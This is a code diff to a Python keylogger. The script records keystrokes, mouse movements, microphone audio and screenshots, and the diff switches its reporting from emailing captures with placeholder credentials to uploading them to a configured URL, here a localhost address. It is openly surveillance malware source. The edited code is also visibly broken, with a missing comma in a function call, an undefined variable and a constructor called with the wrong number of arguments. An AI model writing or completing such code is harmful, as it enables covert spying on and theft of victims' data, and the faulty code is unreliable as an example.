@@ -1,5 +1,6 @@
 try:
     import logging
+    import datetime
     import os
     import platform
     import smtplib
@@ -22,22 +23,29 @@ except ModuleNotFoundError:
 
 
 finally:
-    DOMAIN = "YOUR_DOMAIN"
+    DOMAIN = "https://127.0.0.1:8080/home"
     #EMAIL_ADDRESS = "YOUR_USERNAME"
     #EMAIL_PASSWORD = "YOUR_PASSWORD"
     SEND_REPORT_EVERY = 60 # as in seconds
+    
     class KeyLogger:
         #EDIT THE FOLLOWING SO THAT THERE ARE NO ERRORS WITH "email" or "password"
-        def __init__(self, time_interval, file_path, dest_url):
+        def __init__(self, time_interval, filename, dest_url):
             self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.path = file_path
-            self.url = dest_url
+            #self.log = "KeyLogger Started..."
             #self.email = email
             #self.password = password
+            logging.basicConfig(
+                filename = './%(asctime)s.log'
+                level=logging.INFO,
+                format='%(asctime)s - %(levelname)s - %(message)s',
+            )
 
+            self.path = filename
+            self.url = 'https://127.0.0.1:8080'
+            
         def appendlog(self, string):
-            self.log = self.log + string
+            filename += string
 
         def on_move(self, x, y):
             current_move = logging.info("Mouse moved to {} {}".format(x, y))
@@ -123,11 +131,12 @@ finally:
             obj.writeframesraw(myrecording)
             sd.wait()
 
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+            self.upload_file()
 
         def screenshot(self):
             img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+
+            self.upload_file()
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -157,7 +166,7 @@ finally:
                 except OSError:
                     print('File is close.')
 
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+    keylogger = KeyLogger(SEND_REPORT_EVERY, DOMAIN)
     keylogger.run()
 
 
